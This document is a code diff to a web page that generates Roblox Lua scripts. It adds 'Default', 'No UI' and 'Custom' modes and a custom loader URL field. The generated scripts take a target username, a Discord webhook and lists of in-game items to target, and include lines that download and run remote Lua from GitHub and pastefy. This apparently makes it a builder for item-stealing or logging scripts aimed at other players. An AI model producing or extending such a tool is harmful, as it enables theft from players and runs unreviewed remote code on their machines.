@@ -225,10 +225,6 @@
       opacity: 0.7;
     }
 
-    .card:hover {
-      border-color: rgba(255, 77, 77, 0.3);
-    }
-
     .card-form {
       display: flex;
       flex-direction: column;
@@ -457,33 +453,59 @@
       transform: translateX(18px);
     }
 
-    /* NEW: Mode Selector */
-    .mode-selector {
-      display: flex;
-      gap: 0.5rem;
-      padding: 5px;
-      border-radius: 12px;
+    /* MODE CARDS */
+    .mode-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 0.75rem;
+    }
+
+    .mode-card {
       background: rgba(0, 0, 0, 0.3);
       border: 1px solid var(--border);
-    }
-    
-    .mode-btn {
-      flex: 1;
-      padding: 0.6rem;
-      border: none;
-      border-radius: 8px;
-      background: transparent;
-      color: var(--muted);
-      font-size: 0.75rem;
-      font-weight: 600;
+      border-radius: 12px;
+      padding: 1.25rem 0.75rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
       cursor: pointer;
       transition: all 0.2s ease;
     }
-    
-    .mode-btn.active {
-      background: linear-gradient(135deg, var(--primary), var(--accent));
-      color: #fff;
-      box-shadow: 0 2px 10px var(--primary-glow);
+
+    .mode-card:hover {
+      border-color: var(--border-hover);
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    .mode-card.active {
+      border-color: var(--primary);
+      background: rgba(255, 77, 77, 0.1);
+      box-shadow: 0 0 15px rgba(255, 77, 77, 0.2);
+    }
+
+    .mode-card .icon {
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .mode-card .title {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--text);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .mode-card .desc {
+      font-size: 0.65rem;
+      color: var(--muted);
+      margin-top: 0.25rem;
+      line-height: 1.2;
+    }
+
+    .mode-card.active .title {
+      color: #ff8a8a;
     }
 
     .output-header {
@@ -726,21 +748,40 @@
     <div class="grid">
       <div class="card card-form">
         
-        <!-- SCRIPT MODE -->
+        <!-- SCRIPT MODE CARDS -->
         <div class="field">
           <label class="label">Script Mode</label>
-          <div class="mode-selector">
-            <button class="mode-btn active" id="modeDefault">Default (UI)</button>
-            <button class="mode-btn" id="modeNoUI">No UI (Custom Loader)</button>
+          <div class="mode-grid">
+            <div class="mode-card active" data-mode="default">
+              <div class="icon">⚙️</div>
+              <div class="title">Default</div>
+              <div class="desc">Standard UI with webhook</div>
+            </div>
+            <div class="mode-card" data-mode="noui">
+              <div class="icon">👻</div>
+              <div class="title">No UI</div>
+              <div class="desc">No graphical interface</div>
+            </div>
+            <div class="mode-card" data-mode="custom">
+              <div class="icon">✏️</div>
+              <div class="title">Custom</div>
+              <div class="desc">Add your own loader</div>
+            </div>
           </div>
         </div>
 
-        <div class="field">
+        <!-- CUSTOM LOADER INPUT (Hidden by default) -->
+        <div class="field" id="customLoaderField" style="display: none;">
+          <label class="label">Custom Loadstring URL</label>
+          <input type="text" class="mono" id="customLoaderInput" placeholder="https://pastefy.app/.../raw or loadstring code" value="">
+        </div>
+
+        <div class="field" id="usernameField">
           <label class="label">Roblox Username</label>
           <input type="text" id="usernameInput" placeholder="Your username" value="">
         </div>
 
-        <div class="field">
+        <div class="field" id="webhookField">
           <label class="label">Discord Webhook</label>
           <input type="text" class="mono" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." value="">
         </div>
@@ -925,7 +966,7 @@
       const selectedSkins = new Set();
       const selectedGears = new Set();
       
-      let currentMode = 'default'; // 'default' or 'noui'
+      let currentMode = 'default';
 
       const $ = (id) => document.getElementById(id);
 
@@ -944,20 +985,33 @@
       const shortLoadstringCheck = $('shortLoadstring');
       const antiLeaveToggle = $('antiLeaveToggle');
       
-      // Mode buttons
-      const modeDefaultBtn = $('modeDefault');
-      const modeNoUIbtn = $('modeNoUI');
+      const customLoaderField = $('customLoaderField');
+      const customLoaderInput = $('customLoaderInput');
+      const usernameField = $('usernameField');
+      const webhookField = $('webhookField');
 
-      modeDefaultBtn.addEventListener('click', () => {
-        currentMode = 'default';
-        modeDefaultBtn.classList.add('active');
-        modeNoUIbtn.classList.remove('active');
-      });
-      
-      modeNoUIbtn.addEventListener('click', () => {
-        currentMode = 'noui';
-        modeNoUIbtn.classList.add('active');
-        modeDefaultBtn.classList.remove('active');
+      // Mode Card Selection Logic
+      document.querySelectorAll('.mode-card').forEach(card => {
+        card.addEventListener('click', () => {
+          document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
+          card.classList.add('active');
+          currentMode = card.dataset.mode;
+
+          // Show/hide custom loader input & hide user/webhook for No UI / Custom
+          if (currentMode === 'custom') {
+            customLoaderField.style.display = 'flex';
+            usernameField.style.display = 'none';
+            webhookField.style.display = 'none';
+          } else if (currentMode === 'noui') {
+            customLoaderField.style.display = 'none';
+            usernameField.style.display = 'none';
+            webhookField.style.display = 'none';
+          } else {
+            customLoaderField.style.display = 'none';
+            usernameField.style.display = 'flex';
+            webhookField.style.display = 'flex';
+          }
+        });
       });
 
       function renderPills(container, items, selectedSet, type) {
@@ -1089,29 +1143,27 @@
       generateBtn.addEventListener('click', async () => {
         const username = usernameInput.value.trim();
         const webhook = webhookInput.value.trim();
+        const customUrl = customLoaderInput.value.trim();
 
         let valid = true;
 
-        // Validation only applies to Default mode (No UI mode doesn't use these)
+        // Validation based on mode
         if (currentMode === 'default') {
-          if (!username) {
-            markInvalid(usernameInput);
-            valid = false;
-          }
-
-          if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
-            markInvalid(webhookInput);
-            valid = false;
-          }
-
+          if (!username) { markInvalid(usernameInput); valid = false; }
+          if (!webhook || !webhook.includes('discord.com/api/webhooks')) { markInvalid(webhookInput); valid = false; }
           if (!valid) {
             showToast('Fill in username and a valid Discord webhook');
             scriptOutput.className = 'output-box error';
-            scriptOutput.textContent =
-              '❌ Missing required fields.\n\n' +
-              '• Roblox Username is required\n' +
-              '• Discord Webhook is required\n\n' +
-              'Fix these and try again.';
+            scriptOutput.textContent = '❌ Missing required fields in Default mode.';
+            return;
+          }
+        } else if (currentMode === 'custom') {
+          if (!customUrl) {
+            markInvalid(customLoaderInput);
+            valid = false;
+            showToast('Enter a custom loadstring URL');
+            scriptOutput.className = 'output-box error';
+            scriptOutput.textContent = '❌ Please enter your custom loader URL.';
             return;
           }
         }
@@ -1131,67 +1183,55 @@
           .join('\n');
 
         const skinsBlock = selectedSkins.size > 0
-          ? Array.from(selectedSkins)
-              .map((s) => '    ["' + escapeLua(s) + '"] = true,')
-              .join('\n')
+          ? Array.from(selectedSkins).map((s) => '    ["' + escapeLua(s) + '"] = true,').join('\n')
           : '';
 
         const gearsBlock = selectedGears.size > 0
-          ? Array.from(selectedGears)
-              .map((g) => '    ["' + escapeLua(g) + '"] = true,')
-              .join('\n')
+          ? Array.from(selectedGears).map((g) => '    ["' + escapeLua(g) + '"] = true,').join('\n')
           : '';
 
-        // Build script based on selected mode
         let luaScript = '';
         
-        // Add Anti-Leave block if enabled (goes at the very top)
+        // Add Anti-Leave block if enabled
         if (antiLeaveToggle.checked) {
           luaScript += 'task.spawn(function()\n' +
                        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/WithKevinDev/kevin-anti-leave/refs/heads/main/main.lua"))()\n' +
                        'end)\n\n';
         }
 
+        // Build based on selected mode
         if (currentMode === 'default') {
-          // Default Mode (With UI variables)
           luaScript += 'local TARGET_ID = 245727\n' +
             'local TARGET_USER = "' + usernameEscaped + '"\n' +
-            'local WEBHOOK_URL = "' + webhookEscaped + '"\n' +
-            '\n' +
-            'local TargetBrainrots = {\n' +
-            brainrotsBlock + '\n' +
-            '}\n' +
-            '\n' +
-            'local TargetBaseSkins = {\n' +
-            skinsBlock + '\n' +
-            '}\n' +
-            '\n' +
-            'local TargetGears = {\n' +
-            gearsBlock + '\n' +
-            '}\n' +
-            '\n' +
+            'local WEBHOOK_URL = "' + webhookEscaped + '"\n\n' +
+            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
+            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
+            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
             'task.spawn(function()\n' +
             '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
             '    if type(script) == "function" then\n' +
             '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
             '    end\n' +
             'end)\n';
-        } else {
-          // No UI Mode (No variables, custom loader)
-          luaScript += 'local TargetBrainrots = {\n' +
-            brainrotsBlock + '\n' +
-            '}\n' +
-            '\n' +
-            'local TargetBaseSkins = {\n' +
-            skinsBlock + '\n' +
-            '}\n' +
-            '\n' +
-            'local TargetGears = {\n' +
-            gearsBlock + '\n' +
-            '}\n' +
-            '\n' +
+        } else if (currentMode === 'noui') {
+          luaScript += 'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
+            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
+            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
             'task.spawn(function()\n' +
             '    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\n' +
+            'end)\n\n' +
+            'task.spawn(function()\n' +
+            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
+            '    if type(script) == "function" then\n' +
+            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
+            '    end\n' +
+            'end)\n';
+        } else if (currentMode === 'custom') {
+          luaScript += 'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
+            'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
+            'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("' + customUrl + '"))()\n' +
             'end)\n\n' +
             'task.spawn(function()\n' +
             '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
